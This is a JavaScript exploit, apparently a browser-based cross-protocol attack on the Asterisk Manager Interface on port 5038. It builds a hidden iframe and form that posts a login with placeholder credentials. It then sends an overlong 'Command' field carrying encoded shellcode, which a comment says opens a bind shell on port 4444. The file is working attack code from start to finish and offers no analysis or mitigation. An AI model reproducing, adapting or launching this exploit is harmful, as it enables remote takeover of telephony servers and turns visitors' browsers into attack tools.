var target_ip = 'IP_ADDRESS';
var target_port = '5038';
var payload = '';

// shellcode creates a bindshell on port 4444
var shellcode = "0D0A" +
"416374696F6E3A20436F6D6D61" +
"6E640D0A436F6D6D616E643A20222209" +
"22220922220922220922220922220922" +
"22092222092222092222092222092222" +
"09222209222209222209222209222209" +
"22220922220922220922220922220922" +
"22092222092222092222092222092222" +
"09222209222209222209222209222209" +
"22220922220922220922220922220922" +
"22092222092222092222092222092222" +
"09222209222209222209222209222209" +
"22220922220922220922220922220922" +
"22092222092222092222092222092222" +
"09222209222209222209222209222209" +
"22220922220922220922220922220922" +
"22092222545B81EB0101010181C35B04" +
"01019090FFE30D0A416374696F6E4944" +
"3A20EB0359EB05E8F8FFFFFF4F494949" +
"494949515A5654583633305658344130" +
"42364848304233304243565832424442" +
"48344132414430414454424451423041" +
"44415658345A3842444A4F4D41334B4D" +
"4335435443354C5644504C5648364A45" +
"49394958414E4D4C4238484943444445" +
"48564A5641414E45483643354938414E" +
"4C5648564A354255413548554938414E" +
"4D4C4258424B4856414D434E4D4C4238" +
"44354435485543444948414E424B4846" +
"4D4C424843594C3644504955424B4F53" +
"4D4C425849344937494F424B4B504435" +
"4A464F424F3243474A464A464F324456" +
"493650364948434E445543454948414E" +
"4D4C42385A0D0A0D0A0D0A" + "0D0A0D61";
	
var iframe = document.createElement("iframe");
iframe.setAttribute("id","iwindow");
//iframe.setAttribute("style", "visibility:hidden;");
document.body.appendChild(iframe);

function do_submit(ip, port, content) {
	myform=document.createElement("form");
	myform.setAttribute("name","data");
	myform.setAttribute("method","post");
	myform.setAttribute("enctype", "multipart/form-data");

	myform.setAttribute("action","http://" + ip + 
	   ":" + port + "/abc.html");
	document.getElementById("iwindow").contentWindow.document.body.appendChild(myform); 

	myExt = document.createElement("INPUT");
	myExt.setAttribute("id","extNo");
	myExt.setAttribute("name","test");
	myExt.setAttribute("value",content); 
	myform.appendChild(myExt); 

	myform.submit();
}

payload += "Action: login\n";
payload += "Username: USERNAME\n";
//payload += "Username: mark\n";
payload += "Secret: SECRET\n";
//payload += "Secret: mysecret\n";

for (var i = 0; i<shellcode.length; i+=2) {
    hexstr = shellcode.substring(i,i+2);
    decval = parseInt(hexstr,16);			
    payload += String.fromCharCode(decval);
}

do_submit(target_ip, target_port, payload);

